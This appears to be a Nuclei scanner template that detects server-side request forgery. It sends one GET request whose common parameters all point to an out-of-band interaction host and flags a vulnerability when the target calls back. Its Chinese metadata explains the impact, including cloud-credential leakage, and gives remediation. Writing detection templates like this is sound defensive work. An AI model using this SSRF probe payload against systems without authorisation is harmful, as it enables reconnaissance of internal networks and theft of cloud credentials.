id: oob-param-based-interaction

info:
  name: Parameter Based Generic OOB Interaction
  author: pdteam
  severity: medium
  description: |
    该模板用于检测 Parameter Based Generic OOB Interaction。该类漏洞通常源于服务端可被诱导请求攻击者指定的 URL 或内部地址。模板主要向 `/?u=http://{变量}/&href=http://{变量}/&action=http://{变量}/&host={变量}&http_host={变量}&email=root@{变量}&u...` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可诱使服务器向内网地址、云元数据地址或外部攻击者控制的地址发起请求。
    - 成功利用后可能泄露云临时凭据、探测内网服务、访问未暴露管理接口或触发二次漏洞。
  remediation: |
    - 对服务端发起请求的目标地址实施严格 allowlist，禁止访问本地地址、内网网段和云元数据地址。
    - 禁用不必要的远程 URL 加载功能，并对重定向、DNS 解析和协议类型进行约束。
    - 在网络层限制应用服务器的出站访问，审计异常外联和元数据接口访问记录。
  reference:
    - https://github.com/PortSwigger/collaborator-everywhere
  classification:
    cwe-id: CWE-918
  metadata:
    max-request: 1
  tags: oast,ssrf,generic,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/?u=http://{{interactsh-url}}/&href=http://{{interactsh-url}}/&action=http://{{interactsh-url}}/&host={{interactsh-url}}&http_host={{interactsh-url}}&email=root@{{interactsh-url}}&url=http://{{interactsh-url}}/&load=http://{{interactsh-url}}/&preview=http://{{interactsh-url}}/&target=http://{{interactsh-url}}/&proxy=http://{{interactsh-url}}/&from=http://{{interactsh-url}}/&src=http://{{interactsh-url}}/&ref=http://{{interactsh-url}}/&referrer=http://{{interactsh-url}}/"

    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"
